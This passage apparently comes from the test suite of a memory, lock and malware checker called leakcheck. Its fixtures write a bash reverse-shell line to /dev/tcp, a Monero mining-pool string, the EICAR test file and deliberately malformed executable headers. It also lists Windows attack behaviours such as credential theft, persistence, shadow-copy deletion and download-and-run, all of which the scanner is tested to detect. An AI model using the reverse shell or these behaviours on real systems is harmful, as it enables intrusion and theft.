    pthread_mutex_lock(&audit);
    pthread_mutex_lock(&accounts);
    pthread_mutex_unlock(&accounts);
    pthread_mutex_unlock(&audit);
}
"""


def static_dir(files):
    with tempfile.TemporaryDirectory() as tmp:
        for name, src in files.items():
            with open(os.path.join(tmp, name), "w") as f:
                f.write(src)
        _, r = run_json(["static", tmp])
    return [f for f in r["findings"] if f["type"] == "lock-order-inversion"]


@test("static")
def lock_order_inversion_across_files():
    # the same global mutexes, locked in opposite orders by two files
    inv = static_dir({"bank.c": BANK_C, "audit.c": AUDIT_C})
    expect(len(inv) == 1, inv)
    where = {os.path.basename(inv[0]["stacks"][k][0]["file"]) for k in ("access", "alloc")}
    expect(where == {"bank.c", "audit.c"} and ".c locks them" in inv[0]["message"], inv[0])
    # static mutexes of the same names: each file has its own
    inv = static_dir({"bank.c": BANK_C.replace("pthread_mutex_t a", "static pthread_mutex_t a"),
                      "audit.c": AUDIT_C.replace("extern", "static")})
    expect(inv == [], inv)
    # both orders in one file: reported once, by the file's own pass
    one = BANK_C + AUDIT_C[AUDIT_C.index("void report"):]
    inv = static_dir({"both.c": one})
    expect(len(inv) == 1, inv)


# --------------------------------------------------------------- scan ------

EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
SCAN_PAYLOAD = "stratum+tcp://pool.supportxmr.com:3333 rx/0 donate-level=1\n"


@test("scan")
def scan_ignore_reincludes_a_nested_file():
    with tempfile.TemporaryDirectory() as tmp:
        os.makedirs(os.path.join(tmp, "vendor", "kept"))
        with open(os.path.join(tmp, "clean.txt"), "w") as f:
            f.write("clean\n")
        with open(os.path.join(tmp, "vendor", "ignored.com"), "w") as f:
            f.write(SCAN_PAYLOAD)
        kept = os.path.join(tmp, "vendor", "kept", "checked.com")
        with open(kept, "w") as f:
            f.write(SCAN_PAYLOAD)
        with open(os.path.join(tmp, ".leakcheckignore"), "w") as f:
            f.write("vendor/**\n!vendor/kept/**\n")
        p, report = run_json(["scan", tmp])
        expect(p.returncode == 2, (p.returncode, p.stderr))
        expect(report["summary"]["files_analyzed"] == 3, report["summary"])
        hits = [os.path.basename(f["location"]["file"]) for f in report["findings"]]
        expect(hits == ["checked.com"], hits)


@test("scan")
def scan_audit_deps_ignores_vendored_manifests():
    # 60 vendored manifests would fill the 50-manifest cap before the root
    # one is ever read; pruned dirs never enter the walk.
    with tempfile.TemporaryDirectory() as tmp:
        with open(os.path.join(tmp, "conanfile.txt"), "w") as f:
            f.write("[requires]\nloose-pkg\n")
        mods = os.path.join(tmp, "node_modules")
        os.makedirs(mods)
        for i in range(60):
            d = os.path.join(mods, f"mod{i}")
            os.makedirs(d)
            with open(os.path.join(d, "package.json"), "w") as f:
                f.write('{ "name": "x" }\n')
        os.makedirs(os.path.join(tmp, ".git", "objects"))
        with open(os.path.join(tmp, ".git", "objects", "pack"), "w") as f:
            f.write("x")
        p, r = run_json(["scan", "--audit-deps", tmp])
        expect(types(r) == ["unpinned-dependency"], types(r))
        expect("loose-pkg" in r["findings"][0]["message"], r["findings"][0]["message"])


@test("scan")
def scan_audit_deps_honors_ignored_dirs():
    with tempfile.TemporaryDirectory() as tmp:
        with open(os.path.join(tmp, "conanfile.txt"), "w") as f:
            f.write("[requires]\nloose-pkg\n")
        os.makedirs(os.path.join(tmp, "legacy"))
        with open(os.path.join(tmp, "legacy", "conanfile.txt"), "w") as f:
            f.write("[requires]\nold-pkg\n")
        p, r = run_json(["scan", "--audit-deps", tmp])
        expect(sorted(types(r)) == ["unpinned-dependency", "unpinned-dependency"], types(r))
        with open(os.path.join(tmp, ".leakcheckignore"), "w") as f:
            f.write("legacy/**\n")
        p, r = run_json(["scan", "--audit-deps", tmp])
        expect(types(r) == ["unpinned-dependency"], types(r))
        expect("loose-pkg" in r["findings"][0]["message"], r["findings"][0]["message"])


@test("scan")
@posix_only
def scan_eicar_file_is_reported():
    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, "eicar.com")
        with open(path, "w") as f:
            f.write(EICAR)
        p, r = run_json(["scan", path])
        expect(p.returncode == 2, f"exit {p.returncode}: {p.stderr}")
        expect(r["mode"] == "scan" and types(r) == ["malware-signature"], types(r))
        expect(r["summary"]["files_analyzed"] == 1, r["summary"])
        expect("meant to be found" in r["findings"][0]["message"], r["findings"][0]["message"])
        expect(r["findings"][0]["category"] == "scan", r["findings"][0])
        p, hidden = run_json(["scan", "--disable-rule", "malware-signature", path])
        expect(p.returncode == 0 and hidden["findings"] == [], (p.returncode, types(hidden)))
        tail = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        with open(os.path.join(d, "tail-only.com"), "w") as f:
            f.write(tail)
        p, r = run_json(["scan", os.path.join(d, "tail-only.com")])
        expect(p.returncode == 0 and r["findings"] == [], f"tail alone: {types(r)}")


@test("scan")
def scan_notes_when_the_file_is_past_the_read_cap():
    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, "big.bin")
        with open(path, "wb") as f:
            f.truncate((16 << 20) + 1)  # sparse: logical size, not 16 MB of disk
        p, r = run_json(["scan", path])
        expect(p.returncode == 0 and r["findings"] == [], f"exit {p.returncode}: {types(r)}")
        expect(r["notes"] == [f"scanned first 16 MB of {path.replace(os.sep, '/')}"], r["notes"])


@test("scan")
def scan_leakcheck_binary_is_not_an_eicar_file():
    # The binary quotes the tail, and the head sits elsewhere in it. Other
    # signature needles live in the scanner itself and are not this check.
    _, r = run_json(["scan", leakcheck()])
    eicar = [f for f in r["findings"] if "EICAR" in f["message"]]
    expect(eicar == [], eicar)


@test("scan")
def scan_clean_file_and_missing_path():
    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, "notes.txt")
        with open(path, "w") as f:
            f.write("meeting notes\n")
        p, r = run_json(["scan", path])
        expect(p.returncode == 0 and r["findings"] == [], f"exit {p.returncode}: {types(r)}")
        expect(r["summary"]["files_analyzed"] == 1, r["summary"])
    p = run(["scan", "/no/such/scan-target"])
    expect(p.returncode == 1 and "does not exist" in p.stderr, p.stderr)


@test("scan")
def scan_fingerprints_do_not_depend_on_the_checkout_path():
    # SARIF consumers de-duplicate by partialFingerprints. A fingerprint that
    # embeds the absolute path, or std::hash (which differs between standard
    # libraries), makes the same finding new on every machine and on Windows.
    def fingerprints(root):
        with open(os.path.join(root, "invoice.pdf.exe"), "w") as f:
            f.write("echo hi\n")
        with tempfile.NamedTemporaryFile(suffix=".sarif", delete=False) as f:
            out = f.name
        try:
            run(["-f", "sarif", "-o", out, "scan", root])
            sarif = json.load(open(out))
        finally:
            os.unlink(out)
        results = sarif["runs"][0]["results"]
        expect(len(results) == 1, [r["ruleId"] for r in results])
        return results[0]["partialFingerprints"]["leakcheck/v1"]
    with tempfile.TemporaryDirectory() as a, tempfile.TemporaryDirectory() as b:
        first, second = fingerprints(a), fingerprints(b)
    expect(first == second, (first, second))


@test("scan")
def scan_baseline_survives_an_edit_above_the_finding():
    # A baseline that keys on the byte offset turns every doc edit above a
    # signature into a new finding. The type, file and message are enough.
    payload = SCAN_PAYLOAD
    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, "sample.com")
        with open(path, "w") as f:
            f.write(payload)
        base = os.path.join(d, "base.txt")
        p = run(["scan", "--baseline", "write", base, path])
        expect(p.returncode == 0, (p.returncode, p.stderr))
        p = run(["scan", "--baseline", "compare", base, path])
        expect(p.returncode == 0, (p.returncode, p.stdout))
        with open(path, "w") as f:
            f.write("a line added above the signature\n" + payload)
        p = run(["scan", "--baseline", "compare", base, path])
        expect(p.returncode == 0, f"the same finding moved: {p.returncode}\n{p.stdout}")
        # A second, different signature is still new.
        with open(os.path.join(d, "other.com"), "w") as f:
            f.write(payload)
        p = run(["scan", "--baseline", "compare", base, d])
        expect(p.returncode == 2, f"a finding in a new file must gate: {p.returncode}")


@test("scan")
def scan_survives_a_corrupt_file_of_every_format():
    # A hostile upload is a valid magic followed by impossible numbers. Each
    # format reader must end in a finding or in silence, never in a segfault or
    # a failed allocation, and a corrupt model must be an error, not a crash.
    import struct
    files = {}
    elf = (b"\x7fELF\x02\x01\x01" + b"\x00" * 9 +
           struct.pack("<HHI", 2, 0xb7, 1) +
           struct.pack("<QQQ", 0xffffffffffffffff, 0, 0xffffffffffffffff) +
           struct.pack("<IHHHHHH", 0, 64, 56, 0xffff, 0, 0, 0))
    files["truncated.elf"] = elf
    pe = bytearray(b"MZ" + b"\x00" * 62)
    pe[0x3c:0x40] = struct.pack("<I", 0xffffff00)  # e_lfanew past the file
    files["bad-offset.exe"] = bytes(pe)
    pe2 = (b"MZ" + b"\x00" * 58 + struct.pack("<I", 0x40) +
           b"PE\x00\x00" + struct.pack("<HHIII", 0x14c, 0xffff, 0, 0, 0) +
           struct.pack("<H", 0xffff))  # 65535 sections, optional header size 0xffff
    files["many-sections.exe"] = pe2
    files["truncated.macho"] = (b"\xcf\xfa\xed\xfe" + struct.pack("<IIIIIII", 0x01000007, 3, 2,
                                                                 0xffffffff, 0, 0, 0))
    files["garbage.sh"] = b"#!/bin/sh\n" + bytes(range(256)) * 4
    with tempfile.TemporaryDirectory() as d:
        for name, data in files.items():
            with open(os.path.join(d, name), "wb") as f:
                f.write(data)
        for name in files:
            p, r = run_json(["scan", os.path.join(d, name)])
            expect(p.returncode in (0, 2), (name, p.returncode, p.stderr))
            expect("AddressSanitizer" not in p.stderr and "runtime error" not in p.stderr,
                   (name, p.stderr[-400:]))
            expect(r is not None and "findings" in r, (name, r))
        bad_model = os.path.join(d, "bad.ai")
        with open(bad_model, "w") as f:
            f.write("leakcheck-ai 1\nfeatures 3\ntrees 1\ntree -1\n")
        p = run(["scan", "--ai", "--ai-model", bad_model, os.path.join(d, "many-sections.exe")])
        expect(p.returncode in (1, 3) and "claims" in p.stderr, (p.returncode, p.stderr))


@test("scan")
def scan_report_is_the_same_whatever_the_number_of_threads():
    # Files are scanned at the same time; the report must still come out in file order,
    # with the same findings, notes and counts, for one thread and for many.
    with tempfile.TemporaryDirectory() as d:
        for i in range(240):
            sub = os.path.join(d, f"d{i % 7}")
            os.makedirs(sub, exist_ok=True)
            with open(os.path.join(sub, f"f{i:03}.txt"), "w") as f:
                f.write(f"file {i}\n")
            if i % 11 == 0:
                with open(os.path.join(sub, f"s{i:03}.sh"), "w") as f:
                    f.write("#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
            if i % 17 == 0:
                with open(os.path.join(sub, f"photo{i:03}.jpg.exe"), "w") as f:
                    f.write("x")
        seen = []
        for jobs in ("1", "2", "8"):
            for extra in ([], ["--malware"]):
                p, r = run_json(["scan", "-j", jobs] + extra + [d])
                keyed = [(f["type"], f["location"]["file"], f["message"]) for f in r["findings"]]
                seen.append((extra, p.returncode, r["summary"]["files_analyzed"], keyed, r["notes"]))
        for extra in ([], ["--malware"]):
            same = [s for s in seen if s[0] == extra]
            expect(all(s[1:] == same[0][1:] for s in same), f"{extra}: the threads changed the report")
            expect(same[0][1] == 2 and same[0][2] > 240 and len(same[0][3]) > 20, same[0][1:3])
    for bad in (["-j"], ["-j", "0"], ["--jobs", "x"]):
        p = run(["scan"] + bad + ["/tmp"])
        expect(p.returncode == 1, (bad, p.returncode, p.stderr))


@test("scan")
def scan_directory_of_a_disguised_program_and_a_note():
    with tempfile.TemporaryDirectory() as d:
        with open(os.path.join(d, "invoice.pdf.exe"), "w") as f:
            f.write("echo hi\n")
        with open(os.path.join(d, "notes.txt"), "w") as f:
            f.write("all clear\n")
        p, r = run_json(["scan", d])
        expect(p.returncode == 2 and types(r) == ["masquerade"], f"exit {p.returncode}: {types(r)}")
        expect(r["summary"]["files_analyzed"] == 2, r["summary"])
        expect("looks like a .pdf document" in r["findings"][0]["message"], r["findings"][0]["message"])
        expect(os.path.basename(r["findings"][0]["location"]["file"]) == "invoice.pdf.exe",
               r["findings"][0]["location"])


@test("scan")
@posix_only
def scan_copy_of_a_system_program_under_its_name():
    import shutil
    # Not /tmp: a trusted name there is a masquerade on its own, which would
    # hide the question of whether the bytes are the system's program.
    d = os.path.join(ARGS.build, "scan-shadow")
    os.makedirs(d, exist_ok=True)
    try:
        copy = os.path.join(d, "ls")
        shutil.copy(prog("no_bugs"), copy)
        p, r = run_json(["scan", copy])
        expect(p.returncode == 2 and types(r) == ["masquerade"], f"exit {p.returncode}: {types(r)}")
        expect("like the system's" in r["findings"][0]["message"] and "/ls" in r["findings"][0]["message"],
               r["findings"][0]["message"])
        # the real program, byte for byte, is that program
        shutil.copy("/bin/ls", copy)
        p, r = run_json(["scan", copy])
        expect(p.returncode == 0 and r["findings"] == [], f"a copy of /bin/ls: {types(r)}")
    finally:
        shutil.rmtree(d, ignore_errors=True)


# ---------------------------------------------------------- windows -----
# The same bug classes in programs built for Windows (win_*.c and the portable
# heap_errors.c, leaks.c, cxx_errors.cpp, ...), under the injected runtime.
# On Linux these are skipped; on Windows the "dynamic" suite is.


def win_run(program, case=None, *opts, timeout=120):
    args = ["dynamic", *opts, prog(program)] + ([case] if case else [])
    return run_json(args, timeout=timeout)


for _case in HEAP_CASES:
    def _make_win_heap(case):
        def fn():
            check_heap_case("heap_errors", case)
        fn.__name__ = "windows_heap_" + case.replace("-", "_")
        return fn
    test("windows")(_make_win_heap(_case))


@test("windows")
def windows_clean_program_is_silent_and_keeps_its_status():
    p, r = win_run("no_bugs")
    expect(p.returncode == 0 and r["findings"] == [], f"exit {p.returncode}: {types(r)}")
    expect(r["processes"][0]["complete"] and r["processes"][0]["leak_check"], "scan ran")
    p, r = win_run("no_bugs", "7")
    expect(p.returncode == 7 and r["findings"] == [], f"the program's own status passes through: {p.returncode}")


@test("windows")
def windows_leak_classification_matches_valgrind():
    p, r = win_run("leaks")
    expect(p.returncode == 2, f"exit {p.returncode}")
    totals = leak_totals(r)
    expect(totals.get("definite") == (2, 132), totals)
    expect(totals.get("indirect") == (2, 64), totals)
    expect(totals.get("possible") == (1, 64), totals)
    expect("reachable" not in totals, "reachable hidden by default")
    big = [f for f in r["findings"] if f["category"] == "definite" and f["bytes"] == 100][0]
    frame = top(big, "alloc")
    expect(frame.get("function") == "lose_buffer" and frame.get("file", "").endswith("leaks.c"), frame)
    expect(frame.get("line") == 16, frame)
    _, r = win_run("leaks", None, "--show-reachable")
    reach = [f for f in r["findings"] if f.get("category") == "reachable"]
    expect(any(f["bytes"] == 40 and top(f, "alloc").get("function") == "main" for f in reach),
           [(f["bytes"], top(f, "alloc").get("function")) for f in reach])
    p, r = win_run("leaks", None, "--no-leak-check")
    expect(r["findings"] == [] and p.returncode == 0, types(r))


@test("windows")
def windows_guard_pages():
    _, r = win_run("heap_errors", "uaf-read")
    expect(r["findings"] == [], "a read leaves no trace without guard pages")
    p, r = win_run("heap_errors", "uaf-read", "--guard-every", "1")
    f = find(r, "heap-use-after-free")
    expect("read of freed memory" in f["message"], f["message"])
    expect(top(f, "access").get("function") == "use_after_free_read", top(f, "access"))
    expect(f["stacks"].get("free") and f["stacks"].get("alloc"), "free and alloc stacks")
    for case in ("double-free", "uaf-write", "overflow"):
        _, r = win_run("heap_errors", case, "--guard-every", "1")
        expect(len(r["findings"]) == 1, f"{case}: {types(r)}")


@test("windows")
def windows_cxx_mismatches_leaks_and_clean_idioms():
    for case, msg in [("malloc-delete", "malloc() was released with operator delete"),
                      ("new-free", "operator new was released with free()"),
                      ("array-scalar", "operator new[] was released with operator delete")]:
        _, r = win_run("cxx_errors", case)
        f = find(r, "alloc-dealloc-mismatch")
        expect(msg in f["message"], f"{case}: {f['message']}")
    _, r = win_run("cxx_errors", "sized-delete")
    expect(types(r) == ["free-size-mismatch"], types(r))
    _, r = win_run("cxx_errors", "leak")
    totals = leak_totals(r)
    expect(totals.get("definite") == (1, 24) and totals.get("indirect") == (1, 4000), totals)
    _, r = win_run("cxx_errors", "double-delete")
    expect("double-free" in types(r), types(r))
    p, r = win_run("cxx_errors", "clean")
    expect(p.returncode == 0 and r["findings"] == [], types(r))
    _, r = win_run("mixed_bugs")
    expect(sorted(set(types(r))) == ["double-free", "invalid-free", "memory-leak"], types(r))


@test("windows")
def windows_threads_stress_and_held_blocks():
    p, r = win_run("threads")
    expect(p.returncode == 0 and r["findings"] == [], types(r))
    _, r = win_run("threads", "leak")
    expect(leak_totals(r).get("definite", (0, 0))[0] == 8, leak_totals(r))
    _, r = win_run("threads", "held")
    lost = {k: v for k, v in leak_totals(r).items() if k in ("definite", "possible")}
    expect(not lost, lost)
    p, r = win_run("stress")
    expect(p.returncode == 0 and r["findings"] == [], types(r))


# case: (finding types, category, text of the message)
WIN_RESOURCE_CASES = {
    "file-leak": (["resource-leak"], "fd", "handle"),
    "double-close": (["double-close"], "fd", "already closed"),
    "use-after-close": (["use-after-close"], "fd", "ERROR_INVALID_HANDLE"),
    "stream-leak": (["resource-leak"], "stream", "FILE stream"),
    "stream-double-close": (["double-close"], "stream", "already closed"),
    "stream-use-after-close": (["use-after-close"], "stream", "fread()"),
    "dir-leak": (["resource-leak"], "dir", "FindFirstFile()"),
    "thread-leak": (["resource-leak"], "thread", "CreateThread()"),
    "inherited": (["inherited-descriptor"], "fd", "is inherited"),
    "event-leak": (["resource-leak"], "fd", "CreateEvent()"),
}


def check_win_resource_case(case):
    want_types, want_cat, want_text = WIN_RESOURCE_CASES[case]
    p, r = win_run("win_resources", case)
    expect(p.returncode == 2, f"{case}: exit {p.returncode}")
    expect(types(r) == want_types, f"{case}: {types(r)}")
    f = r["findings"][0]
    expect(f.get("category") == want_cat and want_text in f["message"], f"{case}: {f}")
    stack = "alloc" if f["type"] == "resource-leak" else "access"
    expect(top(f, stack).get("function"), f"{case}: no function in {f['stacks']}")
    if f["type"] == "double-close" and want_cat == "fd":
        expect(f["stacks"].get("free") and f["stacks"].get("alloc"), f"{case}: needs both stacks")


for _case in WIN_RESOURCE_CASES:
    def _make_win_resource(case):
        def fn():
            check_win_resource_case(case)
        fn.__name__ = "windows_resource_" + case.replace("-", "_")
        return fn
    test("windows")(_make_win_resource(_case))


@test("windows")
def windows_handles_released_correctly_are_silent():
    for case in ("file-closed", "stream-closed", "dir-closed", "thread-closed", "process-closed",
                 "not-inheritable", "clean"):
        p, r = win_run("win_resources", case)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


# case: (finding types, category, text of the message)
WIN_SOCKET_CASES = {
    "leak": (["resource-leak"], "fd", "accept()"),
    "double-close": (["double-close"], "fd", "closesocket()"),
    "use-after-close": (["use-after-close"], "fd", "recv()"),
    "eof-spin": (["socket-eof-spin"], "fd", "returned 0"),
    "eagain-spin": (["socket-eagain-spin"], "fd", "nothing to read"),
}


def check_win_socket_case(case):
    want_types, want_cat, want_text = WIN_SOCKET_CASES[case]
    p, r = win_run("win_sockets", case)
    expect(p.returncode == 2, f"{case}: exit {p.returncode}")
    expect(types(r) == want_types, f"{case}: {types(r)}")
    f = r["findings"][0]
    expect(f.get("category") == want_cat and want_text in f["message"], f"{case}: {f}")
    expect(top(f, "alloc" if f["type"] == "resource-leak" else "access").get("function"), f"{case}: {f['stacks']}")


for _case in WIN_SOCKET_CASES:
    def _make_win_socket(case):
        def fn():
            check_win_socket_case(case)
        fn.__name__ = "windows_socket_" + case.replace("-", "_")
        return fn
    test("windows")(_make_win_socket(_case))


@test("windows")
def windows_sockets_used_correctly_are_silent():
    for case in ("eof-few", "eof-stops", "eagain-few", "ordinary"):
        p, r = win_run("win_sockets", case)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


@test("windows")
def windows_lock_owned_by_a_thread_that_ended():
    p, r = win_run("win_locks", "cs-orphan", timeout=60)
    expect(types(r) == ["lock-leak", "orphaned-lock"], types(r))
    f = find(r, "orphaned-lock")
    expect("owner thread has ended" in f["message"] and top(f, "access").get("function") == "takes_it", f)
    expect(p.returncode == 2, f"exit {p.returncode}")


@test("windows")
def windows_trace_children_follows_the_programs_it_starts():
    # without the option the child is not watched; with it, the child's own leak shows
    p, r = win_run("win_resources", "spawn-self")
    expect(p.returncode == 0 and r["findings"] == [] and len(r["processes"]) == 1,
           f"untraced: exit {p.returncode}: {types(r)}")
    p, r = win_run("win_resources", "spawn-self", "--trace-children")
    expect(len(r["processes"]) == 2, f"two processes: {r['processes']}")
    leak = find(r, "resource-leak")
    expect(leak["pid"] != r["processes"][0]["pid"] or leak["pid"] != r["processes"][1]["pid"], leak["pid"])
    expect(p.returncode == 2, f"exit {p.returncode}")


@test("windows")
def windows_process_handles_and_pipes():
    _, r = win_run("win_resources", "process-leak")
    expect(sorted(f["category"] for f in r["findings"]) == ["process", "thread"], [f["category"] for f in r["findings"]])
    _, r = win_run("win_resources", "mutex-pipe-leak")
    expect(types(r) == ["resource-leak", "resource-leak"], types(r))


# case: (type, function where the problem shows, text of the message)
WIN_LOCK_CASES = {
    "cs-inversion": ("lock-order-inversion", "b_then_a", "opposite order"),
    "cs-cycle3": ("lock-order-inversion", "c_then_a", "a cycle of 3 locks"),
    "cs-leak": ("lock-leak", "keeps_lock", "ends while holding"),
    "cs-foreign-unlock": ("foreign-unlock", "unlocks_foreign", "another thread holds"),
    "cs-destroy-locked": ("destroy-locked", "cs_destroy_locked", "this thread holds"),
    "cs-use-after-destroy": ("use-after-destroy", "cs_use_after_destroy", "was destroyed"),
    "cs-wait-unlocked": ("unlocked-wait", "cs_wait_without_lock", "does not hold"),
    "srw-inversion": ("lock-order-inversion", "s2_then_s1", "opposite order"),
    "srw-relock": ("double-lock", "srw_relock", "slim reader/writer lock it already holds"),
    "srw-shared-while-exclusive": ("double-lock", "srw_shared_while_exclusive", "already holds"),
    "handle-inversion": ("lock-order-inversion", "h2_then_h1", "opposite order"),
}
WIN_STOPPED = {"srw-relock", "srw-shared-while-exclusive"}  # would wait forever: the checker stops it


def check_win_lock_case(program, case, want):
    want_type, want_fn, want_text = want
    p, r = win_run(program, case, timeout=60)
    expect(types(r) == [want_type], f"{case}: {types(r)}")
    f = r["findings"][0]
    expect(f.get("category") == "lock" and want_text in f["message"], f"{case}: {f}")
    expect(top(f, "access").get("function") == want_fn, f"{case}: {top(f, 'access')}")
    expect(p.returncode == 2, f"{case}: exit {p.returncode}")


for _case in WIN_LOCK_CASES:
    def _make_win_lock(case):
        def fn():
            check_win_lock_case("win_locks", case, WIN_LOCK_CASES[case])
        fn.__name__ = "windows_lock_" + case.replace("-", "_")
        return fn
    test("windows")(_make_win_lock(_case))


@test("windows")
def windows_std_mutex_locks():
    for case, want in {"inversion": ("lock-order-inversion", None, "opposite order"),
                       "relock": ("double-lock", None, "mutex it already holds"),
                       "shared-inversion": ("lock-order-inversion", None, "opposite order"),
                       "leak": ("lock-leak", None, "ends while holding")}.items():
        p, r = win_run("win_locks_cxx", case, timeout=60)
        expect(types(r) == [want[0]], f"{case}: {types(r)}")
        expect(want[2] in r["findings"][0]["message"], f"{case}: {r['findings'][0]['message']}")
        expect(p.returncode == 2, f"{case}: exit {p.returncode}")


@test("windows")
def windows_locks_used_correctly_are_silent():
    for case in ("cs-ordered", "cs-recursive", "cs-wait-locked", "cs-try-no-order", "srw-readers",
                 "srw-shared-twice"):
        p, r = win_run("win_locks", case, timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")
    for case in ("ordered", "recursive", "condition"):
        p, r = win_run("win_locks_cxx", case, timeout=60)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


# case: (type, text in the message). The programs only attempt the dangerous
# writes, or do them under %TEMP% and HKCU\Software\LeakcheckTest.
WIN_BEHAVIOR_CASES = {
    "startup": ("persistence", "Startup folder"),
    "credentials": ("credential-access", "SSH private key"),
    "hosts": ("system-tampering", "local name table"),
    "system-file": ("system-tampering", "whole system trusts"),
    "sam-file": ("credential-access", "account database"),
    "event-log-file": ("log-tampering", "Windows event log"),
    "run-key": ("persistence", "starts at every login"),
    "defender-key": ("system-tampering", "antivirus"),
    "sam-key": ("credential-access", "account database"),
    "dropper": ("dropper", "written itself"),
    "dropper-cmd": ("dropper", "payload.bat"),
    "shadow-copies": ("destructive-command", "shadow copies"),
    "powershell": ("dropper", "downloads text and runs it"),
    "inject": ("process-injection", "another running program"),
    "read-process": ("credential-access", "memory of another running program"),
    "debugger": ("anti-analysis", "debugger"),
    "privilege": ("privilege-escalation", "SeDebugPrivilege"),
    "event-log": ("log-tampering", "ClearEventLog"),
    "host-lookalike": ("masquerade", "paypal.com"),
    "scan": ("network-scan", "100 different addresses"),
    "ransom": ("ransomware-pattern", ".locked"),
}


def check_win_behavior(case):
    want_type, want_text = WIN_BEHAVIOR_CASES[case]
    p, r = win_run("win_behavior", case, timeout=120)
    expect(p.returncode == 2, f"{case}: exit {p.returncode}")
    hits = [f for f in r["findings"] if f["type"] == want_type]
    expect(hits, f"{case}: {types(r)}")
    expect(any(want_text in f["message"] for f in hits), f"{case}: {[f['message'] for f in hits]}")
    for f in hits:
        expect(f.get("category") == "security", f"{case}: {f}")
    expect(top(hits[0], "access").get("function"), f"{case}: no stack in {hits[0]['stacks']}")


for _case in WIN_BEHAVIOR_CASES:
    def _make_win_behavior(case):
        def fn():
            check_win_behavior(case)
        fn.__name__ = "windows_behavior_" + case.replace("-", "_")
        return fn
    test("windows")(_make_win_behavior(_case))


@test("windows")
def windows_behavior_that_is_ordinary_is_silent():
    for case in ("startup-read", "public-key", "not-a-dropper", "own-memory", "harmless-privilege",
                 "scan-few", "ransom-few", "ransom-backup", "ordinary"):
        p, r = win_run("win_behavior", case, timeout=120)
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: exit {p.returncode}: {types(r)}")


@test("windows")
def windows_masquerade_and_reverse_shell():
    _, r = win_run("win_behavior", "masquerade")
    expect("masquerade" in types(r), types(r))
    texts = " ".join(f["message"] for f in r["findings"])
    expect("svchost.exe" in texts and "Windows system process" in texts, texts)
    _, r = win_run("win_behavior", "reverse-shell")
    f = find(r, "reverse-shell")
    expect("network socket" in f["message"], f["message"])


@test("windows")
def windows_error_exit_code_and_reports():
    p, _ = win_run("heap_errors", "double-free", "--error-exitcode", "9")
    expect(p.returncode == 9, f"--error-exitcode: {p.returncode}")
    with tempfile.TemporaryDirectory() as d:
        sarif = os.path.join(d, "r.sarif")
        p = run(["-f", "sarif", "-o", sarif, "dynamic", prog("heap_errors"), "double-free"], timeout=120)
        expect(p.returncode == 2, p.stderr)
        with open(sarif, encoding="utf-8") as f:
            data = json.load(f)
        expect(data["runs"][0]["results"], "sarif has the finding")


# -------------------------------------------------------------- main ------

def main():
    global ARGS
    ap = argparse.ArgumentParser()
    ap.add_argument("--build", required=True)
    ap.add_argument("--source", required=True)
    ap.add_argument("--suite", default="all")
    ap.add_argument("-k", default="")
    ARGS = ap.parse_args()
    ARGS.build = os.path.abspath(ARGS.build)
    ARGS.source = os.path.abspath(ARGS.source)
    failed = 0
    for suite, fn in TESTS:
        if ARGS.suite not in ("all", suite) or ARGS.k not in fn.__name__:
            continue
        if (suite == "windows") != (WIN and suite == "windows") or (WIN and suite == "dynamic"):
            continue  # each system runs the suite that has its programs
        if WIN and fn.__name__ in POSIX_ONLY:
            continue
        if IS_DARWIN and fn.__name__ in DARWIN_SKIP:
            continue
        try:
            fn()
            print(f"PASS {suite}/{fn.__name__}")
        except Exception as e:  # report and keep going
            if suite != "dynamic":
                failed += 1
                print(f"FAIL {suite}/{fn.__name__}: {e}")
                if not isinstance(e, AssertionError):
                    traceback.print_exc()
                continue
            # One retry: a scheduling flake is visible, a second failure still fails.
            print(f"FAIL {suite}/{fn.__name__} attempt 1: {e}")
            if not isinstance(e, AssertionError):
                traceback.print_exc()
            try:
                fn()
            except Exception as e2:
                failed += 1
                print(f"FAIL {suite}/{fn.__name__} attempt 2: {e2}")
                if not isinstance(e2, AssertionError):
                    traceback.print_exc()
            else:
                print(f"PASS {suite}/{fn.__name__} (retry; attempt 1 failed)")
    print(f"{failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
